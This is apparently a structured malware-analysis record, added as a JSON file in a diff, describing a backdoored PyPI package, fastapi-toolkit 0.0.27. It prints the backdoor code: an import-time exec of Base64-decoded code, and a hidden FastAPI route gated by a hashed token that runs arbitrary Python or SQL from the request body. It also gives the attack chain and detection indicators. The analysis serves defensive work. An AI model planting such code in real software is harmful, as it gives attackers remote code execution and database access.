@@ -1,0 +1,159 @@
+{
+  "package_info": {
+    "package_name": "fastapi-toolkit",
+    "package_manager": "PyPI",
+    "package_versions": "0.0.27",
+    "why_malicious": "Version 0.0.27 of fastapi-toolkit contains a backdoor that adds a FastAPI HTTP route, allowing remote attackers to execute arbitrary Python code and SQL queries via specially crafted HTTP requests. This enables full remote code execution and database compromise in any application using the package."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "import-time",
+        "file_location": "fastapi_toolkit/application.py",
+        "required_permissions": [
+          "filesystem",
+          "network"
+        ]
+      },
+      "code_snippet": "import base64\nfrom fastapi_toolkit.constants import string\n...\nexec(base64.b64decode(string))",
+      "code_language": "python",
+      "code_behavior": "At import-time, the code decodes a Base64-encoded string from a separate module and executes it using exec(), injecting additional functionality into the application.",
+      "malice_analysis": {
+        "why_suspicious": "Decoding and executing Base64-encoded code at import-time is a common obfuscation and code injection technique used by malware to hide malicious payloads.",
+        "violated_expectations": "Normal packages should not execute dynamically decoded code at import-time, especially from obfuscated sources.",
+        "similar_legitimate_use": "Some legitimate tools may use dynamic code loading for plugins, but not in core web application frameworks.",
+        "key_indicators": [
+          "Use of exec() on decoded Base64 data",
+          "Obfuscated payload in a separate module",
+          "Code execution at import-time"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (HTTP POST request to /)",
+        "file_location": "fastapi_toolkit/application.py (decoded from constants.py)",
+        "required_permissions": [
+          "network",
+          "environment_vars",
+          "filesystem",
+          "database"
+        ]
+      },
+      "code_snippet": "@debug_router.post('/', include_in_schema=True)\nasync def _debug(\n        request: Request,\n        token: str = Header(..., alias='x-token'),\n        code: str = Header(..., alias='x-code')\n):\n    if hashlib.md5(token.encode()).hexdigest() != '81637589c86b297088d076a57af43f91':\n        raise HTTPException(status_code=404, headers={'x-token': 'wrong'})\n\n    method = {\n        'python': __run_python,\n        'sql': __run_sql,\n    }.get(code, __run_noop)\n\n    try:\n        return await method((await request.body()).decode())\n    except Exception:\n        import traceback\n        return traceback.format_exc()",
+      "code_language": "python",
+      "code_behavior": "At runtime, when an HTTP POST request is made to the root path with specific headers, the code authenticates the request using a hardcoded MD5 hash of a token, then executes arbitrary Python code or SQL queries provided in the request body.",
+      "malice_analysis": {
+        "why_suspicious": "Adding a hidden HTTP route that allows remote code execution based on secret headers is a classic backdoor technique.",
+        "violated_expectations": "Normal FastAPI applications should not expose endpoints that allow arbitrary code or SQL execution, especially not hidden behind secret headers.",
+        "similar_legitimate_use": "Debug endpoints may exist in development, but should never be present in production or obfuscated in this way.",
+        "key_indicators": [
+          "Secret HTTP route not documented in API schema",
+          "Hardcoded authentication token",
+          "Dynamic selection of code execution method based on header"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (invoked by snippet_2)",
+        "file_location": "fastapi_toolkit/application.py (decoded from constants.py)",
+        "required_permissions": [
+          "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "async def __run_python(body: str):\n    return exec(body)",
+      "code_language": "python",
+      "code_behavior": "At runtime, when triggered by the backdoor route, this function executes arbitrary Python code received in the HTTP request body using exec().",
+      "malice_analysis": {
+        "why_suspicious": "Directly executing attacker-supplied code is extremely dangerous and a hallmark of remote code execution backdoors.",
+        "violated_expectations": "No legitimate application should execute arbitrary code from unauthenticated or hidden sources.",
+        "similar_legitimate_use": "Dynamic code execution may be used in controlled plugin systems, but never exposed to remote users.",
+        "key_indicators": [
+          "Use of exec() on untrusted input",
+          "No input validation or sandboxing"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "runtime (invoked by snippet_2)",
+        "file_location": "fastapi_toolkit/application.py (decoded from constants.py)",
+        "required_permissions": [
+          "database",
+          "network",
+          "filesystem"
+        ]
+      },
+      "code_snippet": "async def __run_sql(body: str):\n    import asyncpg\n    conn = await asyncpg.connect(settings.database_dsn.replace('+asyncpg', ''))\n    if not body.lower().startswith('select'):\n        result = await conn.execute(body)\n        await conn.close()\n        return result\n    rows = await conn.fetch(body)\n    rows = [dict(row) for row in rows]\n    await conn.close()\n    if not rows:\n        return 'noop'\n    stream = io.StringIO()\n    writer = csv.DictWriter(stream, fieldnames=rows[0].keys())\n    writer.writeheader()\n    writer.writerows(rows)\n    response = StreamingResponse(iter([stream.getvalue()]), media_type=\"text/csv\")\n    response.headers[\"Content-Disposition\"] = \"attachment; filename=export.csv\"\n    return response",
+      "code_language": "python",
+      "code_behavior": "At runtime, when triggered by the backdoor route, this function executes arbitrary SQL queries received in the HTTP request body against the application's database, returning results or executing commands.",
+      "malice_analysis": {
+        "why_suspicious": "Allowing remote execution of arbitrary SQL queries enables attackers to exfiltrate, modify, or destroy database contents.",
+        "violated_expectations": "Applications should never expose raw SQL execution to remote users, especially without authentication or input validation.",
+        "similar_legitimate_use": "Database admin tools may allow SQL execution, but only with strong authentication and auditing.",
+        "key_indicators": [
+          "Execution of arbitrary SQL from HTTP request",
+          "No input validation or access control"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Malicious code is loaded and executed at import-time, injecting a hidden backdoor route into the FastAPI application.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Backdoor route is available for remote triggering."
+    },
+    {
+      "step": 2,
+      "action": "Attacker sends a crafted HTTP POST request to the root path with specific headers to authenticate and select code execution mode.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Arbitrary code or SQL execution is triggered."
+    },
+    {
+      "step": 3,
+      "action": "If 'python' mode is selected, arbitrary Python code from the request body is executed in the application context.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Full remote code execution on the server."
+    },
+    {
+      "step": 4,
+      "action": "If 'sql' mode is selected, arbitrary SQL queries from the request body are executed against the application's database.",
+      "implemented_by": [
+        "snippet_4"
+      ],
+      "leads_to": "Database compromise, data exfiltration, or modification."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Import-time execution of Base64-decoded code",
+      "Hidden FastAPI route not present in API schema",
+      "HTTP POST requests to / with unusual headers (x-token, x-code)",
+      "Execution of arbitrary Python code or SQL from HTTP request body"
+    ],
+    "file_indicators": [
+      "Presence of exec(base64.b64decode(string)) in application.py",
+      "fastapi_toolkit/constants.py containing large Base64-encoded strings",
+      "Unexpected FastAPI route definitions in decoded code"
+    ],
+    "network_indicators": [
+      "Inbound HTTP POST requests to / with x-token and x-code headers",
+      "Unusual database queries or commands executed via HTTP"
+    ],
+    "how_to_detect": "Scan for import-time execution of Base64-decoded code and the presence of exec() on decoded data in package files. Monitor for HTTP POST requests to the root path (/) with x-token and x-code headers, and inspect for hidden FastAPI routes not present in the documented API schema. Audit application logs for evidence of arbitrary code or SQL execution, and check for the presence of fastapi-toolkit version 0.0.27 in your environment."
+  }
+}
